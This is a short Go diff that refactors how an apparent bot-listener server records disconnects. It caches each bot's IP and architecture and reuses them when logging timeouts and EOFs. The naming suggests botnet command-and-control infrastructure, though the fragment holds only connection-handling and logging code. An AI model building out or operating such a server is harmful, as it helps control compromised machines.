@@ -111,15 +111,16 @@ func BotListener(port int) {
 }
 
 func handleBot(bot *models.Bot) {
+	botIP := bot.Ip
+	botArch := bot.Arch
+
 	defer func() {
 		state.BotMutex.Lock()
 		bot.IsValid = false
 		bot.Conn.Close()
 		state.BotMutex.Unlock()
 
-		ip := bot.Conn.RemoteAddr().(*net.TCPAddr).IP.String()
-		cause := "EOF"
-		logger.LogBotDisconnect(cause, bot.Arch, ip)
+		logger.LogBotDisconnect("EOF", botArch, botIP)
 	}()
 
 	reader := bufio.NewReader(bot.Conn)
@@ -127,14 +128,13 @@ func handleBot(bot *models.Bot) {
 		bot.Conn.SetReadDeadline(time.Now().Add(45 * time.Second))
 		_, err := reader.ReadString('\n')
 		if err != nil {
-			ip := bot.Conn.RemoteAddr().(*net.TCPAddr).IP.String()
 			cause := "EOF"
 			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
 				cause = "Timeout"
 			} else if err != io.EOF {
 				cause = err.Error()
 			}
-			logger.LogBotDisconnect(cause, bot.Arch, ip)
+			logger.LogBotDisconnect(cause, botArch, botIP)
 			return
 		}
 	}
